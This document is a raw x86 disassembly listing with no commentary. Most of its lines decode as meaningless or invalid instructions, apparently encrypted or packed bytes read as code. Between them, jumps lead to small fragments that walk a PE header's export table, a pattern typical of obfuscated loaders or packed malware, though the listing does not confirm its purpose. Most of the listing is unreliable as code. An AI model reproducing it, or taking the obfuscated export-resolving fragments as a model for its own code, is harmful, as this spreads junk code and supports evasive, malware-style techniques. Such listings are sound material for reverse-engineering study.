  403029:	mov    esi,0x10711c56
  40302e:	pop    ebp
  40302f:	jno    0x402fe8
  403031:	add    cl,0xf6
  403034:	ds sbb al,0x75
  403037:	push   ebp
  403038:	or     bh,BYTE PTR [edi+0x3e]
  40303b:	pop    DWORD PTR [ebx+0x20]
  40303e:	push   ebp
  40303f:	and    al,0x4f
  403041:	jo     0x40303b
  403043:	dec    ebx
  403044:	inc    esi
  403045:	push   esp
  403046:	add    BYTE PTR [ebx+0x49],bh
  403049:	fs xchg ecx,eax
  40304b:	std    
  40304c:	idiv   DWORD PTR [ebp+0x74]
  40304f:	call   0xae9bbe6
  403054:	push   ebx
  403055:	dec    esi
  403056:	dec    esi
  403057:	cld    
  403058:	push   edi
  403059:	mov    edx,0xb7c6c345
  40305e:	ror    ah,0xf
  403061:	xchg   esi,edx
  403063:	xchg   ebp,eax
  403064:	test   eax,0xc0117a2b
  403069:	repz in eax,0x44
  40306c:	(bad)  
  40306d:	lods   al,BYTE PTR ds:[esi]
  40306e:	inc    esp
  40306f:	push   eax
  403070:	scas   al,BYTE PTR es:[di]
  403072:	xchg   edx,eax
  403073:	mov    ds:0xfc856538,eax
  403078:	int    0x79
  40307a:	sub    ah,BYTE PTR [ecx-0x41]
  40307d:	cmp    ch,BYTE PTR [edi-0x33]
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	xor    DWORD PTR [eax],edx
  403099:	xor    BYTE PTR [esi-0x6e],bh
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	xchg   ebp,eax
  4030a4:	adc    DWORD PTR [edi+edx*2],edi
  4030a7:	and    ecx,DWORD PTR [edi+0x68926287]
  4030ad:	outs   dx,BYTE PTR ds:[esi]
  4030ae:	ds cmp al,0x14
  4030b1:	jle    0x403094
  4030b3:	ins    DWORD PTR es:[edi],dx
  4030b4:	push   es
  4030b5:	outs   dx,BYTE PTR ds:[esi]
  4030b6:	in     al,0xf
  4030b8:	in     al,0x93
  4030ba:	sbb    al,0xba
  4030bc:	mov    esi,0x2a0084cb
  4030c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c2:	or     BYTE PTR [edi-0xc],0x28
  4030c6:	inc    ebx
  4030c7:	push   ebx
  4030c8:	(bad)  
  4030c9:	aam    0x1b
  4030cb:	jae    0x403115
  4030cd:	push   edx
  4030ce:	pop    ebx
  4030cf:	jbe    0x40313f
  4030d1:	adc    al,0xa7
  4030d3:	fistp  QWORD PTR [ebp+0x52584f1c]
  4030d9:	jae    0x40313c
  4030db:	or     sp,WORD PTR [esi+ecx*1]
  4030df:	cmp    DWORD PTR [edx+ebx*1],ecx
  4030e2:	lods   eax,DWORD PTR ds:[esi]
  4030e3:	imul   ebp,DWORD PTR [edi],0x79626fef
  4030e9:	sub    al,0xa7
  4030eb:	mov    ?,WORD PTR [edi-0x4cc841c]
  4030f1:	push   ds
  4030f2:	xlat   BYTE PTR ds:[ebx]
  4030f3:	or     eax,0x94fc7f34
  4030f8:	pop    es
  4030f9:	pop    ds
  4030fa:	fmul   QWORD PTR [ebx-0x8]
  4030fd:	test   al,0x46
  4030ff:	int3   
  403100:	and    edi,eax
  403102:	xchg   ebp,eax
  403103:	mov    edx,0xaac44182
  403108:	sbb    eax,0x3fe07b65
  40310d:	(bad)
  403111:	(bad)  
  403112:	sub    BYTE PTR [esi],ah
  403114:	mov    ds:0x5db5b437,eax
  403119:	mov    ds:0x8a3268af,al
  40311e:	jo     0x403115
  403120:	mov    ah,0xf9
  403122:	push   ecx
  403123:	out    dx,eax
  403124:	push   es
  403125:	fsubr  st(4),st
  403127:	scas   eax,DWORD PTR es:[edi]
  403128:	dec    edi
  403129:	mov    bl,0xf3
  40312b:	dec    edi
  40312c:	jo     0x40315a
  40312e:	ss sbb al,0x7f
  403131:	sub    ebp,ecx
  403133:	shl    BYTE PTR ds:0x7164aa8a,0xad
  40313a:	inc    ebp
  40313b:	je     0x403172
  40313d:	jnp    0x403158
  40313f:	icebp  
  403140:	out    0xfd,eax
  403142:	ja     0x403138
  403144:	lahf   
  403145:	(bad)  
  403146:	stos   BYTE PTR es:[edi],al
  403147:	xor    al,0xa3
  403149:	outs   dx,DWORD PTR ds:[esi]
  40314a:	fwait
  40314b:	mov    cl,0x49
  40314d:	(bad)  
  40314e:	(bad)  
  40314f:	adc    al,0xe2
  403151:	dec    ebx
  403152:	mov    WORD PTR [ecx+0x6f795973],fs
  403158:	dec    eax
  403159:	mov    edx,0xb84167da
  40315e:	shl    esi,1
  403160:	jle    0x403171
  403162:	jo     0x40311b
  403164:	mov    esi,0x6f3182a6
  403169:	dec    eax
  40316a:	ja     0x403101
  40316c:	out    dx,eax
  40316d:	push   ecx
  40316e:	sub    BYTE PTR [edi],0x48
  403171:	xchg   DWORD PTR [ebx+eax*2-0x1f],ebx
  403175:	popf   
  403176:	fstp   st(0)
  403178:	pop    ss
  403179:	or     al,0x79
  40317b:	jle    0x403132
  40317d:	pushf  
  40317e:	push   0x39372889
  403183:	sub    DWORD PTR [edx-0xacedb41],ebx
  403189:	mov    ah,bl
  40318b:	jecxz  0x40315e
  40318d:	pop    ebp
  40318e:	in     al,0x4c
  403190:	dec    edi
  403191:	test   BYTE PTR [edi],0x8d
  403194:	ret    0x4900
  403197:	cmp    DWORD PTR ds:0x722e1d44,ebp
  40319d:	test   DWORD PTR [eax],esp
  40319f:	lds    ebp,FWORD PTR [ebx-0x36ad69c2]
  4031a5:	jg     0x4031f4
  4031a7:	frstor [esi+0x34]
  4031aa:	int    0x92
  4031ac:	rcl    al,1
  4031ae:	xor    eax,0xf7105be1
  4031b3:	mov    eax,ds:0xaac8f3b8
  4031b8:	xsave  [esi]
  4031bb:	stc    
  4031bc:	test   al,0x12
  4031be:	popf   
  4031bf:	stos   BYTE PTR es:[edi],al
  4031c0:	fistp  DWORD PTR [ebx+0xe]
  4031c3:	or     DWORD PTR [edi-0x75],ebx
  4031c6:	inc    ah
  4031c8:	jle    0x40317c
  4031ca:	push   esp
  4031cb:	ins    DWORD PTR es:[edi],dx
  4031cc:	loop   0x4031d9
  4031ce:	jnp    0x4031e3
  4031d0:	fsub   DWORD PTR [ebx+0x22]
  4031d3:	or     eax,0x276287a3
  4031d8:	sub    bl,BYTE PTR [edx]
  4031da:	rcl    edx,cl
  4031dc:	inc    edi
  4031dd:	xchg   ebp,eax
  4031de:	js     0x4031da
  4031e0:	mov    ebp,0x33e1c276
  4031e5:	mov    eax,ds:0xa5022509
  4031ea:	sub    eax,0xce028a63
  4031ef:	mov    DWORD PTR [esi],eax
  4031f1:	pop    edx
  4031f2:	fstp   DWORD PTR [edi]
  4031f4:	fwait
  4031f5:	or     DWORD PTR [ebp+0x7f51541e],0x81b93a8e
  4031ff:	inc    edi
  403200:	xchg   ebx,eax
  403201:	test   BYTE PTR [esi],cl
  403203:	push   0x48a52eee
  403208:	xchg   ebp,eax
  403209:	push   ebp
  40320a:	ret    0xb882
  40320d:	adc    DWORD PTR [ebx+0x12e91293],ebp
  403213:	scas   eax,DWORD PTR es:[edi]
  403214:	adc    dl,BYTE PTR [esi]
  403216:	mov    ?,WORD PTR [esi]
  403218:	jl     0x403209
  40321a:	gs xchg ecx,eax
  40321c:	lahf   
  40321d:	popf   
  40321e:	cmc    
  40321f:	xchg   edx,eax
  403220:	sar    BYTE PTR [ebx+eiz*8],cl
  403223:	dec    edi
  403224:	push   ebp
  403225:	jae    0x40323a
  403227:	dec    esi
  403228:	mov    ecx,0xe92f1a19
  40322d:	xchg   esp,eax
  40322e:	inc    eax
  40322f:	test   BYTE PTR [edi],al
  403231:	je     0x40328d
  403233:	mov    dl,0x78
  403235:	loope  0x403204
  403237:	out    dx,eax
  403238:	aad    0xe4
  40323a:	ficomp WORD PTR [ebp+edi*2+0x22]
  40323e:	mov    bl,0x43
  403240:	cs sbb esp,edi
  403243:	jg     0x403233
  403245:	imul   edi,ebx,0xffffffda
  403248:	mov    BYTE PTR [ebx-0x14],bh
  40324b:	(bad)  
  40324c:	retf   0xe476
  40324f:	sub    eax,0xcc6cb767
  403254:	jmp    0x7cf20098
  403259:	add    eax,0x84b9082e
  40325e:	jmp    0x40323e
  403260:	push   0x4d
  403262:	mov    ds:0xca414c76,eax
  403267:	xor    al,BYTE PTR [edi]
  403269:	sbb    al,0x9a
  40326b:	dec    esi
  40326c:	mov    eax,DWORD PTR [ebp+0x35]
  40326f:	jno    0x403273
  403271:	or     al,bh
  403273:	jle    0x403287
  403275:	inc    BYTE PTR [ebp-0x20]
  403278:	in     al,dx
  403279:	cmp    edi,DWORD PTR [edi+esi*4+0x4ef8128e]
  403280:	lods   eax,DWORD PTR ds:[esi]
  403281:	std    
  403282:	sub    al,0x33
  403284:	cmc    
  403285:	fwait
  403286:	dec    esi
  403287:	loopne 0x4032be
  403289:	cmp    BYTE PTR [eax],0x4a
  40328c:	in     eax,dx
  40328d:	fsub   st,st(1)
  40328f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403290:	xor    dh,BYTE PTR [ebp-0x2a863c6e]
  403296:	sub    eax,0x89f4d013
  40329b:	jge    0x40323a
  40329d:	not    cl
  40329f:	push   ecx
  4032a0:	shl    ebp,cl
  4032a2:	sub    DWORD PTR [edx],esp
  4032a4:	fs push es
  4032a6:	ret    
  4032a7:	xchg   esp,eax
  4032a8:	pop    esi
  4032a9:	pop    eax
  4032aa:	test   al,0x47
  4032ac:	aam    0x4d
  4032ae:	repz inc esi
  4032b0:	rcr    DWORD PTR [ecx+0xc],1
  4032b3:	cli    
  4032b4:	(bad)  
  4032b5:	push   ss
  4032b6:	push   ecx
  4032b7:	pop    eax
  4032b8:	shl    BYTE PTR [ebx-0x64],0xb3
  4032bc:	mov    bh,0x2e
  4032be:	sub    eax,0xccc3f323
  4032c3:	jecxz  0x4032fd
  4032c5:	adc    DWORD PTR [edx+0x6c39aa87],edi
  4032cb:	in     al,dx
  4032cc:	aaa    
  4032cd:	jb     0x40330c
  4032cf:	mov    ah,0x97
  4032d1:	or     ecx,DWORD PTR [edx+0x5632ea19]
  4032d7:	xor    BYTE PTR [edi],ch
  4032d9:	add    bh,cl
  4032db:	jns    0x4032ce
  4032dd:	cmp    esi,edi
  4032df:	sub    al,0x9f
  4032e1:	jno    0x40330c
  4032e3:	cwde   
  4032e4:	adc    al,0xd0
  4032e6:	add    DWORD PTR [ebp-0x1e],ebp
  4032e9:	mov    bl,0x57
  4032eb:	mov    dh,0xc5
  4032ed:	(bad)  ds:0xf85c85be
  4032f3:	mov    ah,0x86
  4032f5:	mov    bh,0x2a
  4032f7:	cwde   
  4032f8:	jecxz  0x4032b0
  4032fa:	push   0x20
  4032fc:	enter  0xddfd,0xf1
  403300:	mov    DWORD PTR [edi-0x76],edi
  403303:	sub    esp,DWORD PTR ds:[ecx+0x50691bb2]
  40330a:	les    ebp,FWORD PTR [ecx]
  40330c:	(bad)
  403311:	leave  
  403312:	rcl    eax,1
  403314:	mov    ecx,0xbf1109c7
  403319:	int    0x4d
  40331b:	dec    esp
  40331c:	(bad)  
  40331d:	in     al,dx
  40331e:	bound  ebp,QWORD PTR [ebx-0x52829ac7]
  403324:	mov    bh,0x33
  403326:	mov    BYTE PTR [ebx],0xc7
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x7f3dc34a]
  403372:	cmp    BYTE PTR [ecx+0x781a10f8],0x78
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x4033a2
  40337e:	xchg   ecx,eax
  40337f:	xor    eax,0xa8ecac7b
  403384:	pusha  
  403385:	sbb    ebp,DWORD PTR [ebx+0x3246f24c]
  40338b:	(bad)  
  40338c:	pop    esi
  40338d:	mov    edx,0x4d3bdc67
  403392:	jno    0x403379
  403394:	ret    
  403395:	pop    ds
  403396:	mov    DWORD PTR [eax],esp
  403398:	out    dx,eax
  403399:	sub    DWORD PTR [ebp+ecx*1+0x2],esp
  40339d:	data16 jecxz 0x403329
  4033a0:	push   ds
  4033a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033a2:	(bad)  
  4033a3:	test   al,0xe8
  4033a5:	ficomp DWORD PTR [edi-0x37]
  4033a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a9:	sbb    eax,0x3ad5fc53
  4033ae:	shl    DWORD PTR [eax+ecx*1-0x1d219f72],0x83
  4033b6:	xor    esi,ecx
  4033b8:	push   ss
  4033b9:	test   DWORD PTR [esi+0x40],0x45118efc
  4033c0:	add    BYTE PTR [ecx-0x76],al
  4033c3:	out    0x29,eax
  4033c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c6:	cs xchg ebx,eax
  4033c8:	jno    0x403404
  4033ca:	pop    es
  4033cb:	mov    ecx,DWORD PTR [edi]
  4033cd:	adc    esp,DWORD PTR [ecx+edx*2-0x51]
  4033d1:	fsubr  st,st(3)
  4033d3:	inc    eax
  4033d4:	jmp    0xeaa9:0xfcf4599c
  4033db:	mov    ds:0x24df92eb,eax
  4033e0:	xchg   edi,eax
  4033e1:	cmc    
  4033e2:	mov    ds:0x77c8c491,eax
  4033e7:	mov    esi,0xe9863aea
  4033ec:	cmp    eax,DWORD PTR [ebp-0x4764a9b]
  4033f2:	jb     0x4033da
  4033f4:	push   edi
  4033f5:	adc    edx,DWORD PTR [edx+0x6a843dea]
  4033fb:	(bad)  
  4033fc:	sub    BYTE PTR [ecx+0x5a75e1a7],ah
  403402:	pop    edi
  403403:	jmp    0xea7f:0x30294a69
  40340a:	call   0x90b5:0x6b73793f
  403411:	repnz frstor [edx-0x4189ec20]
  403418:	jle    0x40346f
  40341a:	loop   0x4033ee
  40341c:	xchg   esp,eax
  40341d:	lock dec ebx
  40341f:	mov    al,ds:0xb4f42503
  403424:	ret    
  403425:	and    bh,dl
  403427:	add    BYTE PTR [esi+0x3c],dl
  40342a:	mov    ch,0x9e
  40342c:	xchg   ebp,eax
  40342d:	hlt    
  40342e:	dec    ebp
  40342f:	dec    ecx
  403430:	int    0x31
  403432:	ins    DWORD PTR es:[edi],dx
  403433:	leave  
  403434:	or     eax,0x745e9038
  403439:	add    ah,BYTE PTR [ecx+edi*1-0xa90dfe3]
  403440:	add    BYTE PTR [ebp+0x56],bh
  403443:	outs   dx,BYTE PTR ds:[esi]
  403444:	lds    ebp,FWORD PTR [edx-0x3e]
  403447:	sub    BYTE PTR [edi+ebp*1],bh
  40344a:	fld    st(5)
  40344c:	push   esp
  40344d:	mov    WORD PTR [ecx+ecx*1-0x18817e3f],cs
  403454:	mov    BYTE PTR [ebx],al
  403456:	sbb    al,0x64
  403458:	std    
  403459:	loopne 0x40346a
  40345b:	jl     0x4034a0
  40345d:	adc    bh,BYTE PTR ds:0x138677b8
  403463:	shr    esp,cl
  403465:	nop
  403466:	stc    
  403467:	das    
  403468:	fisttp QWORD PTR [eax]
  40346a:	loop   0x4034cd
  40346c:	imul   edi,DWORD PTR ds:0x333a5a95,0xd6b824d3
  403476:	loope  0x4034af
  403478:	mov    esp,0xc6339ba6
  40347d:	mov    dh,0x15
  40347f:	dec    ebp
  403480:	lds    edi,FWORD PTR ds:0xbab14319
  403486:	loopne 0x4034ea
  403488:	ret    0x844c
  40348b:	xor    eax,0x432e6f5
  403490:	mov    esi,0x15e93c91
  403495:	(bad)  
  403496:	(bad)  
  403497:	iret   
  403498:	cli    
  403499:	fwait
  40349a:	pop    es
  40349b:	add    eax,0xe1405131
  4034a0:	pop    ds
  4034a1:	into   
  4034a2:	bound  ecx,QWORD PTR fs:[ebx-0x27]
  4034a6:	repnz xchg esi,eax
  4034a8:	jmp    0x6fe0:0xf027269c
  4034af:	aas    
  4034b0:	mov    ah,0x12
  4034b2:	ds push ds
  4034b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b5:	loopne 0x40349a
  4034b7:	sub    al,0x5a
  4034b9:	rol    cl,0x95
  4034bc:	mov    edx,0x72df80d
  4034c1:	jbe    0x4034cd
  4034c3:	pop    ebx
  4034c4:	mov    bl,0x3a
  4034c6:	fimul  DWORD PTR [edx]
  4034c8:	fs cmp esi,eax
  4034cb:	inc    esi
  4034cc:	ss mov edx,0x246e97ca
  4034d2:	xor    BYTE PTR [edi+0x5c],dh
  4034d5:	ins    BYTE PTR es:[edi],dx
  4034d6:	sbb    BYTE PTR ds:0xdd64086b,0x35
  4034dd:	sti    
  4034de:	mov    esi,0x5157e73c
  4034e3:	inc    ebp
  4034e4:	out    dx,eax
  4034e5:	shl    DWORD PTR [ecx-0x49],1
  4034e8:	cmp    dh,dl
  4034ea:	lea    ebx,[esi]
  4034ec:	imul   esi,ecx,0x41
  4034ef:	or     edi,ebx
  4034f1:	jae    0x403556
  4034f3:	into   
  4034f4:	stc    
  4034f5:	sar    DWORD PTR ds:0x37dad0f,1
  4034fb:	and    al,0xbc
  4034fd:	jns    0x403482
  4034ff:	popa   
  403500:	ins    DWORD PTR es:[edi],dx
  403501:	retf   0x69ca
  403504:	xchg   esi,eax
  403505:	fist   DWORD PTR [esi]
  403507:	push   ebp
  403508:	mov    DWORD PTR [ecx-0x44],esp
  40350b:	sbb    eax,0x284640f6
  403510:	faddp  st(4),st
  403512:	neg    BYTE PTR [ebp+0x1d8aa680]
  403518:	dec    esi
  403519:	pop    esp
  40351b:	test   BYTE PTR [ecx+ecx*2-0x666a5721],0xa6
  403523:	(bad)  
  403524:	pextrw edi,mm7,0x8a
  403528:	es or  ch,dl
  40352b:	or     DWORD PTR [eax+0x48177219],ebp
  403531:	cmp    al,0xf0
  403533:	aas    
  403534:	or     edi,0xdd954bab
  40353a:	push   edx
  40353b:	pop    esi
  40353c:	lods   eax,DWORD PTR ds:[esi]
  40353d:	cmp    eax,0xc4e64ff2
  403542:	mov    edx,0x8c00d0e2
  403547:	dec    ecx
  403548:	and    esp,ecx
  40354a:	mov    edi,0x22a1ab1d
  40354f:	outs   dx,DWORD PTR ds:[esi]
  403550:	inc    ebp
  403551:	xlat   BYTE PTR ds:[ebx]
  403552:	mov    bl,0x4e
  403554:	pop    ebx
  403555:	xchg   BYTE PTR [ebx-0x456fb108],ah
  40355b:	and    ch,BYTE PTR [esi]
  40355d:	fisttp DWORD PTR [edi-0xd]
  403560:	sti    
  403561:	jae    0x4035d9
  403563:	dec    edi
  403564:	xor    al,0xe5
  403566:	xchg   edx,eax
  403567:	and    ch,BYTE PTR [edi]
  403569:	or     BYTE PTR [edx-0x1],0x62
  40356d:	sti    
  40356e:	dec    esp
  40356f:	adc    al,0x1a
  403571:	stc    
  403572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403573:	leave  
  403574:	sub    eax,0x7afd61d6
  403579:	mov    ecx,0x437a8a26
  40357e:	sbb    eax,0x2d37f1d5
  403583:	pop    es
  403584:	adc    dl,BYTE PTR [eax-0x2b]
  403587:	pop    es
  403588:	mov    es,esp
  40358a:	xchg   ebx,eax
  40358b:	mov    ch,0x46
  40358d:	mov    ebx,0x96fff894
  403592:	jg     0x403517
  403594:	icebp  
  403595:	pop    eax
  403596:	sub    DWORD PTR [bx+di],0x55
  40359a:	pop    ebx
  40359b:	stos   BYTE PTR es:[edi],al
  40359c:	fistp  WORD PTR [eax]
  40359e:	aam    0x38
  4035a0:	or     DWORD PTR [ecx-0x67],ebx
  4035a3:	loope  0x403606
  4035a5:	std    
  4035a6:	jmp    0x2ade442f
  4035ab:	mov    ds,WORD PTR [edx]
  4035ad:	setbe  BYTE PTR ds:0x97ee3e82
  4035b4:	adc    esp,edx
  4035b6:	xchg   ebx,esi
  4035b8:	(bad)  
  4035b9:	and    edi,edi
  4035bb:	test   ch,bh
  4035bd:	call   0xf4bc:0x8f2fc1dc
  4035c4:	mov    esi,0x9ab3bb83
  4035c9:	test   DWORD PTR [edx],0x2b695dd1
  4035cf:	dec    esp
  4035d0:	sub    DWORD PTR [esi+0x60d3fea5],ecx
  4035d6:	ds push edi
  4035d8:	data16 (bad) 
  4035da:	out    dx,al
  4035db:	mov    esi,0xfe27177d
  4035e0:	in     eax,dx
  4035e1:	pushf  
  4035e2:	icebp  
  4035e3:	inc    ecx
  4035e4:	adc    dl,ch
  4035e6:	ret    
  4035e7:	sub    eax,0x9c87bda0
  4035ec:	ds sub dh,0xb4
  4035f0:	fcomp  DWORD PTR [ebx]
  4035f2:	and    eax,0xd4ba879e
  4035f7:	fld    QWORD PTR [esi]
  4035f9:	xor    eax,0xcf224c62
  4035fe:	adc    DWORD PTR [ebx],esi
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x888cfa99,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x40367c
  40363f:	jmp    0x5dd2016b
  403644:	push   0xffffff8f
  403646:	xor    dl,ch
  403648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403649:	inc    esp
  40364a:	(bad)  
  40364b:	bound  ebx,QWORD PTR [edx-0x569d522e]
  403651:	nop
  403652:	mov    esp,0xf6adb1cd
  403657:	mov    ds:0x1f535851,eax
  40365c:	mov    esi,0x8b77befe
  403661:	xlat   BYTE PTR ds:[bx]
  403663:	out    0xea,al
  403665:	stos   DWORD PTR es:[edi],eax
  403666:	mov    edi,0xefa55024
  40366b:	stos   BYTE PTR es:[edi],al
  40366c:	push   eax
  40366d:	aad    0x21
  40366f:	push   ss
  403670:	dec    edi
  403671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403672:	and    BYTE PTR [ecx],bh
  403674:	lods   al,BYTE PTR ds:[esi]
  403675:	enter  0x7970,0xce
  403679:	loope  0x403666
  40367b:	mov    BYTE PTR [ebx-0x57],cl
  40367e:	mov    ebp,0xb8d07c50
  403683:	scas   eax,DWORD PTR es:[edi]
  403684:	adc    eax,ebp
  403686:	call   0x97f37ec1
  40368b:	shr    DWORD PTR [edi-0x7f82646e],cl
  403691:	mov    ebp,0xce1bf820
  403696:	inc    edx
  403697:	jno    0x40367a
  403699:	retf   0x92c0
  40369c:	mov    WORD PTR [ecx+ebx*8+0x1d],gs
  4036a0:	cmp    eax,0x8c636aa9
  4036a5:	pusha  
  4036a6:	pop    es
  4036a7:	xchg   edi,eax
  4036a8:	mov    cl,0x60
  4036aa:	and    BYTE PTR [esi+0x79295529],0x4b
  4036b1:	stc    
  4036b2:	scas   eax,DWORD PTR es:[edi]
  4036b3:	sbb    eax,0xf67f8c09
  4036b8:	push   eax
  4036b9:	(bad)  
  4036ba:	stos   DWORD PTR es:[edi],eax
  4036bb:	push   edx
  4036bc:	idiv   ebp
  4036be:	fsubr  DWORD PTR [edx]
  4036c0:	enter  0x20a0,0x21
  4036c4:	cmp    al,0x9a
  4036c6:	scas   eax,DWORD PTR es:[edi]
  4036c7:	scas   eax,DWORD PTR es:[edi]
  4036c8:	ins    BYTE PTR es:[edi],dx
  4036c9:	inc    ebp
  4036ca:	fist   DWORD PTR [edx-0x1bded41d]
  4036d0:	pop    esi
  4036d1:	stos   DWORD PTR es:[edi],eax
  4036d2:	sbb    al,0x1
  4036d4:	mov    ds:0xb4d1c4db,al
  4036d9:	pop    ecx
  4036da:	push   0xb
  4036dc:	cmp    BYTE PTR [eax+0x750e9128],dh
  4036e2:	xor    BYTE PTR [eax+esi*2-0x29],0xe1
  4036e7:	popf   
  4036e8:	shl    BYTE PTR [ebp+0x73],0xb9
  4036ec:	arpl   WORD PTR [esi+ebx*8-0x27],di
  4036f0:	dec    edx
  4036f1:	xchg   ebx,eax
  4036f2:	sahf   
  4036f3:	jo     0x4036ee
  4036f5:	mov    ?,WORD PTR [edi-0x15a22be0]
  4036fb:	mov    bl,0xc3
  4036fd:	test   ecx,edx
  4036ff:	push   eax
  403700:	jp     0x403750
  403702:	mov    al,ds:0x6628a789
  403707:	jns    0x403745
  403709:	jns    0x403702
  40370b:	cdq    
  40370c:	sbb    al,0x40
  40370e:	sub    eax,0x793ed5d1
  403713:	and    DWORD PTR [edx],esi
  403715:	int    0x7e
  403717:	imul   DWORD PTR [edx-0x3bc051d9]
  40371d:	sbb    DWORD PTR es:[ebx-0x7e],ebx
  403721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403722:	lock push 0xfffffffa
  403725:	fwait
  403726:	outs   dx,BYTE PTR ds:[esi]
  403727:	loope  0x403755
  403729:	(bad)  
  40372a:	(bad)  
  40372b:	sti    
  40372c:	jmp    0x40373f
  40372e:	lahf   
  40372f:	pop    esi
  403730:	js     0x40372b
  403732:	pop    ds
  403733:	jmp    0x508e:0xfa30f31b
  40373a:	sbb    DWORD PTR ds:0xa6de73a6,0x5d
  403741:	ret    
  403742:	add    edx,DWORD PTR ds:0xf0b63987
  403748:	clc    
  403749:	or     cl,BYTE PTR [ebx+0x72]
  40374c:	jns    0x403772
  40374e:	sub    eax,0x2f36c8da
  403753:	add    DWORD PTR [ebp-0x23],edx
  403756:	test   eax,ecx
  403758:	sub    DWORD PTR [edi-0x38ca7916],ebp
  40375e:	cmp    bh,BYTE PTR [edi+0x199baf0c]
  403764:	push   esi
  403765:	mov    dl,0x5
  403767:	jo     0x4037e1
  403769:	les    edx,FWORD PTR [ebx+0x20]
  40376c:	dec    ecx
  40376d:	pop    esp
  40376e:	inc    ebx
  40376f:	mov    BYTE PTR [ebx],ah
  403771:	repnz dec edi
  403773:	jp     0x40373f
  403775:	push   esp
  403776:	aad    0x13
  403778:	jl     0x40372a
  40377a:	or     al,0x70
  40377c:	test   DWORD PTR [ebx],0x83155ab
  403782:	scas   al,BYTE PTR es:[edi]
  403783:	inc    esp
  403784:	pop    esp
  403785:	mov    dh,0xdf
  403787:	int    0xd8
  403789:	shl    BYTE PTR [edx+0x1dea1b95],0x4f
  403790:	(bad)  
  403791:	fidivr WORD PTR [edx+0x1fca5465]
  403797:	ja     0x4037d8
  403799:	test   DWORD PTR [edx-0x5b],esp
  40379c:	mov    ?,ebp
  40379e:	mov    ch,0x52
  4037a0:	mov    ah,0x26
  4037a2:	inc    eax
  4037a3:	mov    ch,0x44
  4037a5:	les    edx,FWORD PTR gs:0xe3ca341e
  4037ac:	hlt    
  4037ad:	push   eax
  4037ae:	std    
  4037af:	adc    BYTE PTR [ebp+edi*8+0x46],0x50
  4037b4:	adc    BYTE PTR [edx-0x71002962],al
  4037ba:	push   ecx
  4037bb:	enter  0xceb9,0xe
  4037bf:	data16 mov BYTE PTR [eax+ebp*1+0x449f1d68],bl
  4037c7:	push   eax
  4037c8:	scas   eax,DWORD PTR es:[edi]
  4037c9:	mov    dh,0x64
  4037cb:	sti    
  4037cc:	sbb    dh,dl
  4037ce:	jecxz  0x4037ce
  4037d0:	sbb    al,0x23
  4037d2:	(bad)  
  4037d4:	sub    eax,0x4a07da5a
  4037d9:	xchg   ebx,eax
  4037da:	push   cs
  4037db:	pop    ebx
  4037dc:	pop    ebp
  4037dd:	push   edx
  4037de:	sar    DWORD PTR [ebx],cl
  4037e0:	(bad)  
  4037e1:	xchg   esi,eax
  4037e2:	or     BYTE PTR [eax],cl
  4037e4:	ret    
  4037e5:	sub    eax,0xd826b0ec
  4037ea:	dec    ah
  4037ec:	push   ds
  4037ed:	adc    DWORD PTR [ebx+0x68c0fdfe],0xffffff91
  4037f4:	jbe    0x403843
  4037f6:	inc    edi
  4037f7:	push   ds
  4037f8:	and    eax,0x1c3bbe02
  4037fd:	push   edi
  4037fe:	mov    dl,0xb
  403800:	pop    ecx
  403801:	out    0x10,al
  403803:	adc    ecx,DWORD PTR [esp+eax*2-0x7ba4c281]
  40380a:	mov    DWORD PTR [edx+0x1576f298],esp
  403810:	imul   esi,DWORD PTR [ecx],0x4e9af789
  403816:	(bad)  
  403818:	xchg   esp,eax
